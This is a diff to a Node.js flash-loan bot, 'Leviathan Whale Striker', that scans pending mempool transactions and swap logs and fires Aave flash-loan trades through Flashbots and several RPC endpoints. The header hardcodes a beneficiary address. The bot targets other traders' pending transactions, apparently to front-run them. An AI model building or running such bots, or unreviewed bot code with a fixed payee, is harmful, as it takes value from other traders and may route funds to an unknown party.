@@ -1,7 +1,8 @@
 // ===============================================================================
-// APEX LEVIATHAN WHALE STRIKER v21.2 (SUMMIT MERGE) - HIGH-FREQUENCY CLUSTER
+// APEX LEVIATHAN WHALE STRIKER v21.3 (ULTIMATE MERGE) - HIGH-FREQUENCY CLUSTER
 // ===============================================================================
 // FIXED: NONCE COLLISION + SIMULATION ROBUSTNESS + MULTI-CHANNEL RELAY
+// STRATEGY: DUAL-LAYER DETECTION (PENDING TX + LOG DECODING)
 // TARGET BENEFICIARY: 0x4B8251e7c80F910305bb81547e301DcB8A596918
 // ===============================================================================
 
@@ -58,7 +59,8 @@ const GLOBAL_CONFIG = {
     RPC_POOL: [
         "https://eth.llamarpc.com",
         "https://1rpc.io/eth",
-        "https://rpc.flashbots.net"
+        "https://rpc.flashbots.net",
+        "https://base.llamarpc.com"
     ],
 
     // 🌍 NETWORKS
@@ -104,8 +106,8 @@ const GLOBAL_CONFIG = {
 if (cluster.isPrimary) {
     console.clear();
     console.log(`${TXT.bold}${TXT.gold}╔════════════════════════════════════════════════════════╗${TXT.reset}`);
-    console.log(`${TXT.bold}${TXT.gold}║   ⚡ LEVIATHAN WHALE STRIKER v21.2 | CLUSTER ENGINE    ║${TXT.reset}`);
-    console.log(`${TXT.bold}${TXT.gold}║   DUAL SNIPE: PENDING TXS + SWAP LOG DECODING          ║${TXT.reset}`);
+    console.log(`${TXT.bold}${TXT.gold}║   ⚡ LEVIATHAN WHALE STRIKER v21.3 | CLUSTER ENGINE    ║${TXT.reset}`);
+    console.log(`${TXT.bold}${TXT.gold}║   DUAL LAYER: PENDING TXS + LOG DECODING (FIXED)       ║${TXT.reset}`);
     console.log(`${TXT.bold}${TXT.gold}╚════════════════════════════════════════════════════════╝${TXT.reset}\n`);
 
     const cpuCount = Math.min(os.cpus().length, 32);
@@ -115,7 +117,7 @@ if (cluster.isPrimary) {
     for (let i = 0; i < cpuCount; i++) cluster.fork();
 
     cluster.on('exit', (worker) => {
-        console.log(`${TXT.red}⚠️ Worker ${worker.process.pid} offline. Respawning...${TXT.reset}`);
+        console.log(`${TXT.red}⚠️ Worker offline. Respawning...${TXT.reset}`);
         setTimeout(() => cluster.fork(), 2000);
     });
 } 
@@ -138,7 +140,7 @@ async function initWorker(CHAIN) {
         try {
             const network = ethers.Network.from(CHAIN.chainId);
             
-            // Reliability Fix: Fallback provider pool
+            // Reliability: Fallback provider pool for broad broadcasting
             const rpcConfigs = [CHAIN.rpc, ...GLOBAL_CONFIG.RPC_POOL].map((url, i) => ({
                 provider: new JsonRpcProvider(url, network, { staticNetwork: true }),
                 priority: i + 1, stallTimeout: 1500
@@ -162,7 +164,7 @@ async function initWorker(CHAIN) {
                 setInterval(updatePrice, 20000);
             }
 
-            console.log(`${TXT.green}✅ WORKER ${cluster.worker.id} ACTIVE on ${CHAIN.name}${TXT.reset}`);
+            console.log(`${TXT.green}✅ CORE ${cluster.worker.id} ACTIVE on ${CHAIN.name}${TXT.reset}`);
 
             const poolIface = new Interface([
                 "function flashLoanSimple(address receiverAddress, address asset, uint256 amount, bytes calldata params, uint16 referralCode)"
@@ -176,7 +178,7 @@ async function initWorker(CHAIN) {
                 } catch (e) {}
             }
 
-            // LAYER A: PENDING MEMPOOL SNIPE (Speed)
+            // --- LAYER A: PENDING MEMPOOL SNIPE (Speed) ---
             wsProvider.on("pending", async (txHash) => {
                 try {
                     scanCount++;
@@ -195,7 +197,7 @@ async function initWorker(CHAIN) {
                 } catch (err) {}
             });
 
-            // LAYER B: LOG DECODER SNIPE (Accuracy)
+            // --- LAYER B: LOG DECODER SNIPE (Accuracy) ---
             const swapTopic = ethers.id("Swap(address,uint256,uint256,uint256,uint256,address)");
             wsProvider.on({ topics: [swapTopic] }, async (log) => {
                 try {
@@ -218,6 +220,7 @@ async function initWorker(CHAIN) {
 
 async function executeStrike(provider, wallet, iface, gasOracle, ethPrice, CHAIN, flashbotsProvider) {
     try {
+        // Wealth-Based Scaling
         const balanceEth = parseFloat(formatEther(await provider.getBalance(wallet.address)));
         const usdWealth = balanceEth * ethPrice; 
 
@@ -234,7 +237,7 @@ async function executeStrike(provider, wallet, iface, gasOracle, ethPrice, CHAIN
             0
         ]);
 
-        // TRIPLE-CHECK PRE-FLIGHT
+        // TRIPLE-CHECK PRE-FLIGHT (Nonce Latest Fix)
         const [simulation, l1Fee, feeData, nonce] = await Promise.all([
             provider.call({ to: CHAIN.aavePool, data: tradeData, from: wallet.address, gasLimit: GLOBAL_CONFIG.GAS_LIMIT }).catch(() => null),
             gasOracle ? gasOracle.getL1Fee(tradeData).catch(() => 0n) : 0n,
@@ -268,18 +271,18 @@ async function executeStrike(provider, wallet, iface, gasOracle, ethPrice, CHAIN
                 value: 0n
             };
 
-            // NUCLEAR BROADCAST
+            // --- NUCLEAR BROADCAST (Triple Path) ---
             if (CHAIN.type === "FLASHBOTS" && flashbotsProvider) {
                 const signedTx = await wallet.signTransaction(txPayload);
                 flashbotsProvider.sendBundle([{ signedTransaction: signedTx }], (await provider.getBlockNumber()) + 1);
-                console.log(`   ${TXT.green}🎉 Bundle Secured (Flashbots)${TXT.reset}`);
+                console.log(`   ${TXT.green}🎉 Bundle Secured (Flashbots Relay)${TXT.reset}`);
             } else {
-                // Reliable Channel
+                // Reliable Channel (Ethers)
                 wallet.sendTransaction(txPayload).then(res => {
                     console.log(`   ${TXT.green}🚀 TX BROADCAST: ${res.hash}${TXT.reset}`);
                 }).catch(() => {});
 
-                // High-Speed RPC Channel
+                // High-Speed Channel (Manual RPC Push)
                 const signedTx = await wallet.signTransaction(txPayload);
                 axios.post(CHAIN.privateRpc || CHAIN.rpc, {
                     jsonrpc: "2.0", id: 1, method: "eth_sendRawTransaction", params: [signedTx]
